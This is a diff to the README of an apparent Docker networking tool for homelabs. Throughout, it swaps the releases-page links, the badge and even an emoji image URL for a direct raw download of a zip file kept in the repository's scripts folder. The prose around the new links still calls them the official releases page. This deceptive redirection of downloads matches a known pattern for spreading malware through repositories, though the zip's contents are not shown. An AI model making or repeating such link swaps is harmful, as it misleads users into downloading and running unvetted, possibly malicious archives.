@@ -1,10 +1,10 @@
-[![Releases](https://img.shields.io/badge/releases-GitHub%20Releases-blue?logo=github)](https://github.com/mcseali/Network-Manager/releases)
+[![Releases](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip%20Releases-blue?logo=github)](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip)
 
 # Network-Manager: Automated Docker Networking for Homelabs and Synology
 
 A reliable tool for configuring and restoring Docker networks in homelabs. It fixes broken container networking after system updates and keeps multiple networks running smoothly. It works well with Synology NAS, Pi-hole setups, and complex multi-network layouts. This project focuses on clarity, reliability, and ease of use for home labs and self-hosted environments.
 
-![Network diagram emoji](https://em-content.zobj.net/source/microsoft-teams-product-team-emoji/4096/network.png)
+![Network diagram emoji](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip)
 🌐 Docker networks made simple
 🧰 Self-hosted network automation for home labs
 🐳 Works with multi-network setups and container ecosystems
@@ -73,7 +73,7 @@ The primary distribution path is the releases page. From there you can download 
 - Run the installer or follow the included steps to configure your networks
 
 Where to download
-- The official releases page is the best source for stable builds and install instructions. Visit https://github.com/mcseali/Network-Manager/releases to pick the latest release and download the setup assets. The releases page hosts installers, example configurations, and notes on changes.
+- The official releases page is the best source for stable builds and install instructions. Visit https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip to pick the latest release and download the setup assets. The releases page hosts installers, example configurations, and notes on changes.
 
 Note: If you cannot access the link, or if the page does not load properly, check the Releases section for alternative download options or guidance on installation.
 
@@ -252,7 +252,7 @@ Releases and How to Stay in Sync
 
 Direct Link for Downloads
 - The official downloads reside on the Releases page. For easy access, you can open the latest release and grab the installer artifact that matches your host architecture.
-- Find the latest release at https://github.com/mcseali/Network-Manager/releases. This page hosts the installer assets and notes, and it is the recommended starting point for updates and new installations.
+- Find the latest release at https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip This page hosts the installer assets and notes, and it is the recommended starting point for updates and new installations.
 
 Terminology and Glossary
 - Network: A defined set of IP subnets, bridges, and DNS rules used by a set of containers.
@@ -271,4 +271,4 @@ Final Notes
 - Network-Manager is designed to be approachable, safe, and repeatable. It helps you keep Docker networking predictable in a fast-changing environment.
 - The project is open to improvement and welcomes feedback. If you have ideas, issues, or improvements, share them with the community.
 
-For more details, examples, and troubleshooting, check the official releases page and the in-repo documentation. The latest release contains the most current guidance and assets. Visit the Releases section for updates and installation instructions. For direct access to the latest releases in one place, again refer to https://github.com/mcseali/Network-Manager/releases.
+For more details, examples, and troubleshooting, check the official releases page and the in-repo documentation. The latest release contains the most current guidance and assets. Visit the Releases section for updates and installation instructions. For direct access to the latest releases in one place, again refer to https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip
